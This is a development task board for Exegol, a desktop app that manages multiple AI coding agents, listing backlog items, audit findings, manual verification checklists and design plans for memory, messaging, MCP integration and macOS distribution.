# Exegol — Task Board

> Audience: current contributors planning the next implementation wave after the initial MVP.
> This board is the active backlog for product differentiation, operational confidence, and release readiness.
> **Pending tasks only** — completed work lives in [`TASK_COMPLETED/`](./TASK_COMPLETED/) (monthly files) and `CHANGELOG.md` (per release).

> **Quality gate before PR**
> - `bun run lint` (pinned Biome 2.4.7, fails on warnings) and `bun run typecheck`
> - `bun run test && bun run test:shared`; CI (`.github/workflows/ci.yml`) runs the same plus `cargo test` and `bun run build`
> - Max 400-500 LOC per file unless a refactor task explicitly says otherwise

---

## Priority Order

### Daily readiness (2026-09-22): ACTIVE
> Source: the 2026-09-22 docs/board audit plus `RESEARCH/EXEGOL_REVIEW_2026_09_05.md`.
> Goal: an installed build Antonio can use every day. Features wait.

**P0**
1. **Installable build**: version is 0.5.0. `bun run package:mac`, install to /Applications, then
   run both manual-verification checklists below on the PACKAGED app. Tag v0.5.0. Open items from
   the pre-build audit are T193.

**P1**
2. opencode TUI dies across app quit (Wave 2 checklist below)
3. Sidecar terminal correctness: T184.2 (unanswered DA1/colour queries), T184.3 (replay re-asks
   queries), T184.4 (kills a pid without identity check), T185.14 (backpressure), T185.8 (reattach replay)
4. T184.5: a failing `beforeAgent` silently prevents the spawn
5. T181 purge UI + one retention policy (nothing is deleted any more; oplog keeps git trees)
6. T183.2: AI features dark without an API key (Sparkles commit, scoring, evaluator)
7. T185.11: scheduler timeout records two results and frees capacity early; T185.1 scheduler UI
8. T185.6 / T185.7 / T185.9: main-process freezes (token scan, idle serialize, worktree status)
9. T182.8: History pagination

**Wave 2.6 status (2026-07-06 → 2026-08-11)**: T149-T152 shipped (`TASK_COMPLETED/2608.md`).
Open exit criteria: both manual checklists below, and cut **v0.5.0** (T156 dashboard landed;
T142 postponed by Antonio 2026-08-11).

**P2 — Post-launch bets (next round):** T153 Awareness Engine · T133 remote channel (Telegram;
remote continuity is the most visible gap vs Omnara / Claude web / Codex Remote) · T132 automations
catalog (after T185.11) · T134 ACP experimental · T135 derived status + CDC · T136 tiered merge
resolver · T137 hunk assignment + absorb · T138 ModeTracker · T139 skills security scan · T144
dependency/library audit

> **Docs to review before Wave 3 design** (merged with PR #82, pending review — Antonio 2026-08-11):
> `docs/ARCHITECTURE/COUNCIL_BASE.md` (council mode / structured executions — backs T188/T189)
> + `docs/ARCHITECTURE/OWL_FLEET_WATCH.md` (fleet watch module — backs T186-T188, T159).

### Shipped waves
- **Wave 3: fleet + coordination (2026-08 to 2026-09)**: T149-T152, T155, T156, T157, T160, T161
  (resume picker), T162 phases 1-2, T163 core, T166.1, T167, T168, T170.1, T172.1/5-7, T175.1, T176, T177, T178,
  T179.3, T180, T181 core, T183.1 terminal fidelity, T184.1. Details: `docs/TASK_COMPLETED/2608.md`, `2609.md`.
- **Wave 2 — Competitive Review (2026-07)**: T123-T131, T88v2, T140, T141, T143, T145-T148
  across WT-A/B/C/D. Details: `docs/TASK_COMPLETED/2607.md`.

- **Wave 1 — Stack Optimizations (Terax review, 2026-05)**: quick wins + WT1-WT5 + T120 settings window.
  Details: `docs/TASK_COMPLETED/2605.md` · `docs/CHANGELOG.md` · analysis `docs/RESEARCH/TERAX_STACK_REVIEW.md`
- Earlier waves (V1-V3, T01-T107): `docs/TASK_COMPLETED/2603.md`, `2604.md`, `docs/ARCHIVED/APPLIED/`

### Manual verification pending (post-merge) `added: 2026-05-22`
Wave 1+2 landed via 5 parallel WTs, T120 on top. Manual smoke-test recommended before broad release:
- OSC 7 cwd badge on shell panes (open shell, `cd /tmp`, verify badge updates)
- OSC 133 prompt boundaries (jump-to-previous-prompt should work)
- Parallel agent comparator (spawn 2-3 agents on same task, verify columns + promote button)
- Isolation badge states (isolated / pipeline / project-root / fallback)
- [x] Stop-reason panel — VERIFIED 2026-07-09 (codex exit: overlay with Completed badge + "New agent with same task" + "View diff")
- CSP changes (open DevTools console, verify zero CSP violations on basic flow)
- Capability allowlist (no functional regression — all routers/IPC still callable from renderer)
- **T120 settings window**: Cmd+, opens standalone; second Cmd+, focuses existing (no duplicate); Cmd+W closes settings only; main close also closes settings; minimize main keeps settings visible; theme change in settings reflects in main without reload

### Manual verification pending — Wave 2 `added: 2026-07-05`
- [x] **T123 deterministic status — VERIFIED 2026-07-09** (live session, Antonio + Fable):
  full cycle observed with real claude-code — `prompt_submit→turn_started/running`,
  `tool_use→working`, `stop→finished/waiting_input`, ~1ms event→signal latency.
  **Delivery finding**: the OSC-777→PTY path does NOT deliver (Claude Code captures hook
  stdout; `/dev/tty` doesn't reach the PTY) — verification uncovered that the hook
  **file-event channel** (`~/.exegol/events` → NotifyHandler) delivers perfectly but was
  wired to a log-only stub; fixed in PR #63 (`dispatchAgentFileEvent` → signal pipeline,
  with OSC-priority guard + terminal-status guard + 6 regression tests). File channel also
  adds `prompt_submit` = turn-START boundary the OSC hook set never had (feeds T129).
  Still pending below: attention signal (needs a permission-prompt scenario).
  Optional follow-up (P3): debug OSC delivery or drop the OSC hooks in favor of file events.
- Desktop notification on agent finished/failed + attention (with pending-question body)
- Attention Inbox: TitleBar queue, Cmd+J jump, unread badges
- Knowledge tab: opt-in setup (no files written on tab open), digest refresh, MEMORY.md sync/import
- [x] Exegol MCP — **VERIFIED 2026-08-11**: shim framing bug found+fixed; claude shows
  `exegol · connected · 3 tools`; live memory_search (empty-correct) → 3× memory_save
  (ids+categories) → retrieval ✅. Pending only: read-mode denial (spawn a read-mode agent,
  memory_save must be refused). Follow-up still open: MCP HOST StdioTransport may have the
  same LSP-framing bug the shim had (external stdio servers likely can't connect).
  (`memory_list`, the AND→OR recall retry and opencode MCP config shipped: 2608.md, T163.)
- Polish note (verify session): shell/agent exit card duplicates the scrollback tail
  visible right below it — slim the AgentStopReason card (keep actions, drop/collapse tail)
- Pipeline evidence: score badge + AI summary per step, Export Report
- Evaluator gate: template with gate step persists (zod fix), ship/retry routing works
- Oplog v2: Turn Snapshots tab lists per-step snapshots; restore refuses cross-worktree
- Race promote & clean: dirty loser prompts; live-agent loser refuses cleanup
- Onboarding wizard on fresh profile: CLIs detected (packaged build especially — PATH fix)
- Monitor → Resources: eviction actually drops RSS; budget alert fires once per period
- **🐛 FOUND 2026-08-11 (investigate): opencode TUI child dies across app quit** — the
  wrapper shell survives in the sidecar (reattach OK, prompt shows `took 18m48s`) but the
  opencode process exits, printing its `Continue: opencode -s ses_…` message; typing then
  goes to the stale shell over a dead TUI screen. claude-code survives the identical flow.
  Suspect: signal/EOF sensitivity difference in the TUI child when the app disconnects.
  Recovery path exists by design: resume_command is captured (T101) → session browser
  (T155.5) offers the resume. Mitigations shipped in verify session: Refresh Terminal
  (repaint) + Open Terminal (dead panes).

### P3 — Strategic bets / larger scope (post Wave 2)
- **SSH Remote Development** (T73)
- **CI/CD release pipeline** (T45): validation CI shipped (PR #115); release workflow pending
- **Canary channel** (T46)
- **Cross-repo workspaces** (T92) — front + back in one workspace (T146 project groups is the cheap precursor)
- **Mobile companion app** (T93) — natural successor of T133 Telegram channel
- **Headless daemon mode** (T94) — prerequisite for T93
- **Panel Plugin SDK** (T97) — extensible panel system, v1.0 architecture (design spike first)
- **Ephemeral validation containers** (T154) — run tests/evaluator checks in disposable Apple `container` VMs (NOT agent isolation)
- **xterm renderer pool** (T114): measure first, T115 DormantRing and T178 hidden-pane byte cut already shipped
- **Vercel AI SDK + Ollama** (T122) — value compounds with T130/T147 in-process LLM calls
- **Issue tracker expansion** (T71) — Linear/Jira; plugs into T142 integrations registry
- **T60 project hooks** — ⚠️ mostly superseded by shipped T91 (`.exegol/lifecycle.yaml`); pending delta only: `archive` hook on worktree archival + env vars — review & fold or drop

---

## Active Backlog

### T153 — Project Awareness Engine `added: 2026-07-07`
**Priority**: P2 — **Wave 3 headline candidate** (do NOT start before Wave 2.6 exit criteria) | **Effort**: L (phased) | **Source**: original idea (Antonio) + design analysis 2026-07-07 + **reference implementation studies: `RESEARCH/CODEBASE_MEMORY_MCP_2026_07.md` + `RESEARCH/COCOINDEX_2026_08.md`** (adopt: two-tier mtime/hash freshness, logic fingerprint per collector, model-id in cache keys, ownership-based reconcile, macOS watcher-recreation loop, AST-derived FTS terms, source views for context packs; verdict: patterns yes, crate no) (adopt: index_coverage honesty table, FILE_CHANGES_WITH co-change drift, detect_changes hop-risk, source_hash caching, min-cosine multi-keyword recall; design spike must evaluate shelling out to the tool's CLI vs building file-level indexing in-house)

**Why**
- A lightweight per-project local worker that maintains living code memory, detects small
  health signals, and prepares context for big agents. Directly deepens the uncontested
  moat: **cross-provider shared brain** — Claude/Codex/Gemini/Aider all consume one
  project memory no first-party vendor can replicate. Local-first (code never leaves the
  machine for the awareness layer) = privacy + zero-subscription pitch.
- ~65% of the plumbing already shipped: knowledge node (T140), memory store + salience v2
  (T126), Exegol MCP server (T145), scheduler engine, resource monitor (T143),
  NotificationBus/Attention Inbox (T124/T141). Build as **evolution of
  `.exegol/knowledge/`**, never a parallel `.project-ai/` system.

**Scope — phased (trust is one-shot: 2-3 false positives kill the Health Inbox)**
- **Phase 1 — deterministic signals, NO LLM** (absorbs T132 automations catalog):
  git/fs watcher → stale TODOs (grep + git blame), branches without PR (git + gh), outdated
  deps (manifest parse), doc-mention vs manifest mismatch (e.g. README says Prisma, deps
  have Drizzle), **git co-change coupling** (codebase-memory-mcp formula: 6-month `git log
  --name-only`, skip commits >20 files, ≥3 co-changes, `score = co_count / min(a,b)`,
  threshold 0.3 → "you changed A; B co-changes 78% and wasn't touched"). Watcher = cheap
  adaptive git poll (`rev-parse HEAD` + `status --porcelain`, 5s + 1s/500 files, cap 60s)
  plus our OSC/afterCommit hooks for intra-session reaction. Deliver via NotificationBus →
  **Project Health Inbox** (severity + confidence + mandatory evidence: file/line/fragment).
  Near-100% precision before any model opines.
- **Phase 2 — embedded local model**: per-file memory (purpose, exports, internal deps)
  for changed files only, 1-3 files per cycle → file_index → **context pack** injected at
  agent spawn. Schema (proven by codebase-memory-mcp): `qualified_name` stable key,
  `file_hashes(sha256, mtime_ns, size)` staleness ledger, **`index_coverage` honesty table**
  (rows for partially-indexed files — the pack never pretends completeness), **`source_hash`
  caching** for AI summaries (regenerate only on input-hash mismatch). Micro-task queue with
  budget; pause on high CPU/RAM/battery (resource monitor gates). Modes: Off / Light
  (deterministic only) / Balanced (1.7B) / Deep (4B+). Memory recall side-upgrade:
  **min-cosine multi-keyword** in `memory/store.ts` (all query terms must match, not average).
- **Phase 3 — semantic doc↔code drift** (README says 7-day expiry, sessionConfig uses 30):
  high confidence threshold, always "suggestion" until track record accumulates,
  `needs_human_review` flag.

**MCP integration (key differentiator — extends T145 Exegol MCP server)**
- New tools on the existing token-authenticated socket: `project_context_get` (context
  pack: purpose, modules, key files, open observations, recent changes),
  `health_inbox_list` (open signals), `project_activity_recent` (bridge to `activities`/
  oplog: what agents did recently in this repo)
- Observations feed the memory store (salience/supersession applies); knowledge DIGEST.md
  refresh consumes the file_index
- External agents (any of the 14 built-in CLIs) get the shared brain mid-session, not just at spawn

**Execution architecture (decided 2026-07-07)**
- **Runtime**: llama.cpp `llama-server` binary as an **inference sidecar** (same pattern
  as the PTY sidecar: pid file, health check, on-demand spawn, idle shutdown 5-10 min
  frees RAM). NOT in-process node-llama-cpp (1-2GB weights inside Electron main + another
  napi rebuild dep). Binary ships signed in the .app (~5-10MB/arch).
- **Client**: single OpenAI-compatible abstraction, base-URL configurable — same code path
  for embedded llama-server and optional Ollama upgrade (T122's one-abstraction rule;
  `@ai-sdk/openai-compatible` if T122 lands first)
- **Structured output**: `response_format: json_schema` (GBNF grammar at decode time) —
  small model physically cannot emit invalid JSON; zod-validate on receipt anyway
- **Models** (shortlist verified 2026-07): default **Qwen3 1.7B dense Q4** (~1.2GB,
  Apache 2.0 — bundling-safe license), Deep mode **Qwen3 4B** (~2.5GB); alternates
  Phi-4-mini 3.8B (MIT), Llama 3.2. Optional via Ollama: Qwen3-Coder-Next (80B-A3B).
  Tiny embeddings model (~300MB) for file_index search.
- **Weights install**: app ships WITHOUT weights → opt-in first-activation download
  (versioned manifest, pinned SHA256, resumable, `~/.exegol/models/`) → validate via
  checksum + inference smoke test (schema-valid JSON) → Doctor (T148) check. Engine
  states: `disabled → downloading → validating → ready`; Phase 1 works with no model.

**Hard rules (from the original proposal — keep)**
- Never analyzes the whole repo at once; never modifies code; all output JSON-validated;
  every observation carries evidence; low confidence → suggestion, not alert; budgeted
  execution; per-project off switch.

**Likely files**
- New: `apps/desktop/src/main/awareness/` (watcher, task-queue, micro-tasks, inference
  sidecar client), `resources/bin/llama-server`
- Extend: `mcp/exegol-tools.ts` (+3 tools), `knowledge/*` (file_index consumer),
  `agents/spawn-context.ts` (context pack), `notifications/bus.ts` (health signals),
  `system/doctor.ts` (model check), migrations set (file_index, observations, task queue)

---

### T154 — Ephemeral Validation Containers `added: 2026-07-09`
**Priority**: P3 — strategic bet (post Wave 3) | **Effort**: M-L | **Source**: idea (Antonio) + Apple `container` 1.0.0 (2026-06-09, 30k+ ⭐, WWDC26 "Container machine")

**Why**
- **Scope guard first**: this is NOT Sculptor-style agent-in-container isolation — the
  competitive review explicitly rejected that (worktrees + accessModes cover 90% with 10%
  of the friction; Docker-as-requirement kills onboarding). This is narrower and different:
  **disposable validation sandboxes** — run tests, builds, and evaluator-gate checks away
  from the main machine, in a throwaway environment.
- The timing turned: Apple's native `container` hit 1.0.0 (June 2026) — VM-per-container
  with sub-second boot, OCI images, zero Docker Desktop dependency, Swift/Apple Silicon
  native. The "Container machine" feature (WWDC26) is exactly this use case: build/test a
  project on Linux from macOS with directory mirroring.
- **Killer internal use case**: parallel agents / race mode candidates running test suites
  collide on ports, DBs, and dev servers. A disposable container per validation run removes
  the whole conflict class — and makes evaluator gates (T88v2) stronger: "tests pass in a
  clean room" is better evidence than "tests pass on the dev's hot machine".

**Scope (design spike first)**
- Runtime abstraction: Apple `container` CLI first (macOS 26 + Apple Silicon); detect-and-
  degrade — feature hidden when unavailable; optional adapters later (colima/docker if present)
- Per-project validation profile in `.exegol/lifecycle.yaml` (extends T91): image, setup
  cmds, test cmd, resource caps
- Integration points: evaluator gate step type "run validation container" (T88v2), Smart Git
  Button pre-push check, race-mode comparator column (tests green per candidate), Health
  Inbox signal on red
- Worktree → container mount (readonly bind of the agent's worktree; results out via exit
  code + captured output, stored as pipeline evidence T130)
- Budget/cleanup: hard timeout per run, auto-remove on exit, cap concurrent containers via
  resource monitor (T143)

**Likely files**
- New: `apps/desktop/src/main/validation/` (runtime adapter, profile loader, run manager)
- `main/pipeline/evaluator-step-handler.ts` (gate integration), `lifecycle/loader.ts`
  (profile), `GitPane/SmartGitAction.tsx` (pre-push check), `system/resources.ts` (caps)

---

### T161 — Session naming ↔ CLI session identity `added: 2026-08-11` `updated: 2026-08-13`
**Priority**: P2 | **Effort**: M | **Source**: Antonio, during the multi-agent rounds

Shipped 2026-08-13: the spawn modal now offers this provider's resumable sessions ("New
session" vs a codename chip with how long ago it ended) and a per-launch YOLO checkbox.
`listResumable` carries the alias, so a session is picked by the name the user knew it by.

Still open, and it is the interesting half: **claude and codex can NAME a session** (their
own `rename` command) and resume it BY that name — `claude --resume "<name>"` opens it
directly. Exegol currently keeps a separate identity (its codename) from the CLI's own, so
after a restart the user renames by hand in each terminal to line them back up.

Wanted: when Exegol assigns a codename, push it INTO the CLI's session name where the
provider supports it, and prefer name-based resume over the captured resume command. One
identity instead of two, and `agents_list` names then survive outside Exegol. Needs a
per-provider capability (`supportsSessionRename`, `resumeByName`) rather than a special
case; lands as a field of the T191 provider descriptor.

---

### T162 — Agent Links & Rooms `added: 2026-08-12`
**Priority**: P1 (Wave 3) | **Effort**: M (phased) | **Source**: idea (Antonio 2026-08-12) + `ARCHITECTURE/COUNCIL_BASE.md` (exchange bus) + trinity human-gate patterns + **`RESEARCH/HERDR_2026_08.md` design requirements (2026-08-12): send-and-wait atomic (event cursor captured pre-write), `delivery_not_observed` error distinct from reply timeout, replies KEYED to message id + receiver-session pinning (never satisfied by a state transition or a successor session), reads never clear the human's seen-bit**

**Why**
- "Cuando termines avisale a revisor-api" works today only if the agent remembers to call
  agent_send. A LINK makes Exegol enforce it: deterministic signals (T123) fire the notify
  at the turn boundary even when the model forgets. Rooms generalize it to multi-agent
  feedback (A builds, B+C review) — the council preset from COUNCIL_BASE.md.

Phases 1-2 (directed links + roles, `agent_link`, w3_002) shipped 2026-08-12 (PR #101), see
`TASK_COMPLETED/2609.md`. Pending from them: dashboard link UI (link icon on cards), `once:false`
recurring links live-verify.

**Remaining: Rooms.** N-agent membership; message to a room fans out (one per boundary per
member); the human sees the thread. Build on T25 messages + a room_id column. COUNCIL_BASE
exchange-bus MVP only, no headless council executions. Absorbs:
- T172.4 broadcast / shared session context (the same isolation rules written twice by hand)
- T183.6 threads survive restart: `inReplyTo` lives only on the in-memory `PendingMessage`;
  needs a `thread_id` column

**Likely files**
- `main/agents/agent-messaging.ts` (links + fanout), `mcp/exegol-{protocol,tools}.ts`
  (+agent_link), migration set wave3, dashboard card link UI, Attention/messages UI

---

### T163 — MCP Config Injection: all providers `added: 2026-08-12`
**Priority**: P1 | **Effort**: S-M | **STATUS: core SHIPPED 2026-08-12** (PR #96 stale-shim proxy + PR #97 codex/opencode/gemini injection; devin + agy wired later, `exegol-mcp-config.ts:408-425`) — pending live verify + remaining CLIs: aider, goose, amp, kiro, kilocode, crush, factory-droid

- Today only claude-code gets `.mcp.json` → only claude agents can use agents_list /
  agent_send / memory tools. Extend `mcp/exegol-mcp-config.ts` per provider:
  codex (`~/.codex/config.toml` mcp_servers, or project `.codex/config.toml` — verify),
  opencode (`opencode.json` mcp section), gemini (`.gemini/settings.json` mcpServers),
  others per docs — each with the same shim command + per-agent token env, written at
  spawn into the agent cwd, removed/revoked on exit. Doctor check: which providers have
  MCP wiring available.
- **agy (Antigravity) MCP = via PLUGINS (discovered 2026-08-12)**: the CLI has `/mcp` in
  the TUI but config only via its plugin system — `agy plugin install <target>` with a
  plugin dir containing `plugin.json` + `mcp_config.json` (standard mcpServers shape;
  binary strings confirm). Plan: ship an "exegol" plugin scaffold (generated under
  ~/.exegol/agy-plugin/) + idempotent `agy plugin install` at spawn; token via
  mcp_config env if agy forwards it (validate live — codex-style sanitization possible,
  shim cwd fallback as plan B). Until then agy is receive-only (PTY injection works).
- **Stale-shim gap (live incident 2026-08-12)**: long-lived CLI sessions keep the shim
  binary spawned at THEIR start — new tools (agent_send) are invisible until the session
  restarts (juanito/paco couldn't message). Fix candidates: shim forwards a server-pushed
  `notifications/tools/list_changed` (needs persistent socket + stdout notification), or
  shim re-fetches tool defs from the server per tools/list instead of its bundled copy
  (cheapest — defs already live server-side). Until then: new MCP tools require agent
  session restart.

---

### T164 — Memory Anchors: memories addressed by the code index `added: 2026-08-12`
**Priority**: P1-P2 (Wave 3 — pairs with T153 Phase 2; anchor table can land before the full engine) | **Effort**: M | **Source**: idea (Antonio: "las memorias serían alrededor del index") + **`RESEARCH/COCOINDEX_2026_08.md`** (full design in § "Hipótesis")

**Why**
- Antonio's hypothesis, validated with inverted framing: the index is the COORDINATE SYSTEM
  memories are addressed in, not where they live. Memories get an address → staleness becomes
  mechanical (drift ≠ supersede) → recall becomes location-aware (file/symbol/call-graph/
  co-change before global RRF) — the concrete way MCP memories "get better".

**Scope (from the research doc — see it for the schema)**
1. `memory_anchor` table (anchor_kind file|symbol|range, symbol_qname, source_hash +
   snippet_fp, confidence explicit|inferred, state fresh|drifted|orphaned|relocated)
2. MCP `memory_save` accepts optional anchor (path + symbol/range resolved server-side
   against extracted declarations — NEVER trust an LLM-freehand qname); infer from
   turn-touched files when absent
3. Anchor verifier runs in the SAME sweep as index updates (two-tier mtime/hash check;
   symbol-level snippet_fp = "someone edited another function → still fresh")
4. `drifted` = recall penalty + context-pack flag; `orphaned` = suppressed, never deleted
5. Location-aware recall in context packs: anchored-to-file → referenced symbols →
   co-change neighbors → global RRF fallback

**Likely files**
- migration set wave3 (memory_anchor), `memory/store.ts` (+anchor-aware recall),
  `mcp/exegol-tools.ts` (memory_save anchor param), T153 worker (verifier), Rust core
  (declaration extractor — see cocoindex `code_ast` as reference impl)

---

### T165 — Messaging stack hardening (simplify follow-ups) `added: 2026-08-12`
**Priority**: P2 | **Effort**: M | **Source**: 4-agent /simplify over T157–T162 (2026-08-12) — correctness landed in PR #102; these are the larger/architectural residuals

- **Lifecycle event emitter**: `broadcastAgentStatus` (a transport fn) still owns delivery + link firing + `getDb()`, forcing the documented import-cycle workaround. Extract an in-main `agent:turn-ended {agentId, reason}` emitter (notifications/bus pattern) that agent-messaging subscribes to once at bootstrap; spawn-env goes back to broadcast+tray.
- MCP config writer table + wiring panel from the registry: moved to T191.
- Per-session token identity: moved to T173.
- **SessionAlias window-listener → store**: `renamingAgentId` field in the workspace/agents store instead of N window listeners.
- **mapLinkRow → zod** (agentLinkRowSchema) to match every other table's validated mapping.

---

### T185 — Daily-readiness audit `added: 2026-09-22`
**Priority**: P1 unless noted | **Effort**: S-M each | **Source**: 2026-09-22 code audit + `RESEARCH/EXEGOL_REVIEW_2026_09_05.md` findings #3-#9. Items fixed in the same PR are in `TASK_COMPLETED/2609.md`.

**Dead or missing surface**
1. **Scheduler has no UI** since 274e611 (SchedulerSection deleted); the sidebar Schedulers section
   was removed in the 2026-09-22 PR. Create/edit/toggle/run UI missing; hooks in
   `renderer/hooks/use-trpc-scheduler.ts` unused.
2. **Ollama project indexing has no start button**: `indexer.startIndexing/search/projectStats` have
   no renderer caller; the Settings section describes a feature the user cannot run.
3. **Parallel runs**: `parallel-run:changed` broadcast is in neither the capabilities IPC list nor
   preload (UI polls every 10s); `agents.cancelParallelRun` has no UI.
4. **Dead surface** (P2): `agent:signal` / `agent:turn-boundary` broadcasts have no subscriber;
   tables `sessions`, `port_registry`, `host_metrics` unused; `messages.*` and `queue.*` have no UI;
   preload `browser.captureElement` unused. Wire or delete (feeds T144).
5. **LLM tier-3 score persists (w3_009) but nothing displays it**: show it in Scoring/History or stop
   the paid Haiku call.

**Main-process stalls**
6. **Tokens tab Scan** (`tokens/log-parser.ts`) is sync `readFileSync` + `JSON.parse` over
   `~/.claude/projects`: 2.1s freeze at ~1GB. Move to a worker_thread or stream with mtime skip.
7. **Headless xterm serialize on main** (`headless-emulator.ts:83`), 25-40ms per 5000 lines: runs on
   every 5s scrollback flush per agent even when idle (add a dirty flag), and twice per pane mount
   (`use-terminal-lifecycle.ts` fetches a full snapshot to test non-empty, `terminal-setup.ts`
   fetches again; the lifecycle hook's `markData` is unused and could be wired).
8. **Reattach replays up to 8MB ring snapshot through `callbacks.onData`** (`pty-host.ts` ~146):
   ~100-150ms blocking per live agent at startup, and it re-fires old status/OSC signals. Write the
   snapshot to the emulator only and seed the scrollback buffer tail directly.
9. **`projects.listAllWorktrees` calls sync napi `worktreeHasChanges` per worktree** on the main
   thread (10ms/worktree here, est 150ms+ on 10k files). Use a napi AsyncTask or async git status.
10. **GitPane / SmartGitAction / TerminalPanel poll git status + `gh pr view` every 15s**: refetch on
    turn-end / commit / push events instead.

**From the 2026-09-05 review (reproduced there, confirmed still in code 2026-09-22)**
11. **Scheduler timeout double-records and frees capacity early** (#3): the 10-min timeout
    (`scheduler/engine.ts:277`) logs `timeout`, drops the task from `runningTasks` without stopping
    the agent, and a later finish logs `success` for the same run. Stored `maxTokenBudget` and
    `skillName` never reach spawn options; a full concurrency slot returns without a durable
    deferred run. Separate task from run; persist queue, attempt and terminal state; close each run
    once. Prerequisite for T132.
12. **Embeddings: a failed call leaves a permanent hole, and a model change never invalidates**
    (#4, #5): `indexProject` stores the file hash before the vector, so a `null` embedding is never
    retried; the cache compares content hash only, and `cosineSimilarity` truncates to the shorter
    dimension. Persist model id, dimension and chunker version per index generation. Before T153.
13. **Indexer follows symlinks out of the repo** (#6): `project-indexer.ts:51` uses `stat`, no
    real-path containment, no `.gitignore`. Git-aware enumeration, skip external symlinks.
14. **Sidecar memory pressure** (#9): `pendingBytes` counts UTF-16 units, not bytes; ring eviction
    only touches idle sessions (33 active rings = 264 MiB > 256 MiB target); `broadcast`
    (`pty-sidecar-entry.ts:65`) ignores `client.write`'s return, so a slow client grows the socket
    queue unbounded. Test with a slow and a healthy client. Pairs with T184.2-4 (bump
    SIDECAR_VERSION).
15. **Memory salience reinforces a negation** (#7, P1 for T158/T164): `classifyObservation`
    (`salience.ts:51,61`) reinforces "Always run migrations…" with "Never run migrations…" (word
    similarity > 0.8). Auto-dedup only exact normalized matches; supersession needs an explicit
    relation, provenance and reason.

**Left from the PR simplify pass** (P2)
16. **Settings defined three times**: the `Settings` type, `settingsSchema` defaults and
    `DEFAULT_SETTINGS` drift (that is how zod stripped the Ollama keys). Make
    `Settings = z.infer<typeof settingsSchema>` and `DEFAULT_SETTINGS = settingsSchema.parse({})`;
    reconcile `agentClis` (schema `[]`, constant 4 entries) first.
17. **Other untyped CustomEvents**: `switch-section` is typed now (`lib/switch-section.ts`); give
    `spawn-agent` and the rest a typed `WindowEventMap` so detail keys are checked at both ends.
18. **One apply-status helper**: status dedup covers the parser path only; the other 7
    `broadcastAgentStatus` callers still write the DB and broadcast on repeats.

---

### T195 — Distribution: notarized universal build + GitHub release `added: 2026-09-24`
**Priority**: P1, ship with 0.5.1 | **Effort**: M

First share failed (2026-09-24): the 0.5.0 DMG sent over Slack would not open on a teammate's Mac.
Expected from the points below (quarantine + no notarization, and arm64 only if that Mac is
Intel). Next build goes out as a GitHub release download, notarized; downloading from GitHub alone
would hit the same wall.

Signing works (Developer ID, local keychain) but the DMG is not notarized, so any downloaded copy
(browser, Slack, Mail, AirDrop: all set the quarantine flag; a GitHub release does not avoid it)
hits Gatekeeper, and on macOS 15 only System Settings > Privacy & Security > "Open Anyway" gets
past it. It is also arm64 only.
1. Notarization: `notarize: true` in `electron-builder.ts`, credentials from env only (Apple ID +
   app-specific password + team NQHHJ85736, or an App Store Connect API key .p8 for CI).
2. Universal build (Intel + Apple Silicon): core-rust for `x86_64-apple-darwin` too, the
   `@libsql/darwin-x64` binary (not installed today), node-pty x64; `target: universal` or two DMGs.
3. GitHub release: DMG + zip + `latest-mac.yml` (zip and yml feed the auto-updater, which already
   points at dPeluChe/exegol releases), via `gh release create` or CI with secrets.
4. Validate on someone else's Intel and Apple Silicon Mac: downloaded DMG opens with no warning;
   auto-update goes from one release to the next.
5. Build note: after `bun install --frozen-lockfile` electron-vite's nested esbuild binary went
   missing (`write EPIPE` at config load); `bun install --force` restored it. Check in CI.

### T193 — v0.5.0 pre-build audit leftovers `added: 2026-09-22`
**Priority**: P1 unless noted | **Source**: 2026-09-22 pre-build audit. Fixed items are in `TASK_COMPLETED/2609.md`.

**Distribution**
1. Not notarized (`notarize: false`); a CI build without the Developer ID cert is ad-hoc signed, so
   Squirrel updates fail. Local builds sign with the keychain identity.
2. `process.execPath` is written into hooks, `.mcp.json` and CLI configs: launching from the DMG
   volume or a translocated path breaks them once the app moves. Install to /Applications first;
   long term, rewrite those paths at startup when execPath changed.
3. arm64 only (`core-rust.darwin-arm64.node`, no `@libsql/darwin-x64`). P2.
4. node-pty `prebuilds/darwin-arm64/spawn-helper` has no exec bit; works only because
   `rebuild:native` builds `build/Release/spawn-helper`. chmod in an afterPack hook.
5. Dev and packaged share `~/.exegol` sidecar socket and pid (same SIDECAR_VERSION reuses each
   other's sidecar). P2.
6. `@exegol/core-rust` undeclared in `apps/desktop`; `vitest` undeclared in `packages/shared`. P2.

**Agents**
7. `onExit` ignores the signal (`pty-host.ts:67`): a manual Stop records completed/failed, not
   stopped (pipelines now guard on paused).
8. Memory extraction on exit is dead (`extractAndStoreMemories` only via `memory.extract`, never
   called since 8b26000). Decide: wire on exit or drop from CLAUDE.md.
9. Reattach doesn't recreate title trackers.
10. `getAppSettings` falls back to defaults on bad JSON; the next update saves over the row.

**Pipelines and git**
11. After a restart a paused run's step agent is still alive; resume spawns a second one.
12. `{{diff}}` (up to 16 MiB) goes into argv; over ~1MB the spawn fails. Pass via file (T183.11).
13. Without core-rust (`dev:ui`) runs silently use the project root.
14. Resume/Export pipeline mutations and Git stage/unstage have no onError; renamed or quoted
    paths break staging; Create PR is offered on main.
15. Pipeline snapshot restore runs on `project.path`; Rust refuses the cross-worktree restore (safe,
    now visible as a toast). Pass the run's worktree path.

**History, parallel, QA, files**
16. History: opencode moved to SQLite (adapter reads JSON only); Gemini now uses `projects.json`
    folder names (adapter reads hashed `tmp/`); no "resume from history" button.
17. Parallel runs: no Cancel in the UI; if every spawn fails the run stays `running` forever.
18. QA Run does nothing unless the browser pane is focused (`use-browser-qa.ts:252`).
19. Files pane: no size/binary guard before Monaco.
20. Global hotkey stops working after the main window closes (`window.ts:10`).
21. Knowledge, Tasks and Add Memory swallow errors; archiving can overwrite `tasks_completed.md`
    (`task-file-actions.ts:40`).
24. A theme toggle rebuilds every terminal (`isLight` in the mount deps) instead of setting
    `options.theme`: one-off cost, but every PTY re-replays its snapshot. P2.
22. P2 debt: `trpcMutate<any>("agents.spawn")` x9; ~30 stale biome suppressions; unused renderer
    hooks (`use-trpc-mcp`, `-search`, `-budgets`, `-scoring`); MCP serverInfo version hardcoded 1.0.0;
    CLI package 0.4.0.

---

### T191 — Provider capability descriptor `added: 2026-09-22`
**Priority**: P2 | **Effort**: M | **Source**: merge of overlapping provider-knowledge items

Per-provider behaviour lives in at least five hand-synced tables. Declare it once on the provider
definition in `agents/registry.ts` so custom providers get it too. Absorbs:
- T165/T166: one descriptor table for the per-provider MCP config writers + token read chain
  (`exegol-mcp-config.ts`, 506 LOC), and derive the MCP wiring panel
  (`procedures/mcp.ts` `EXEGOL_MCP_PROVIDER_WIRING`) from it (`mcpConfigFlavor`)
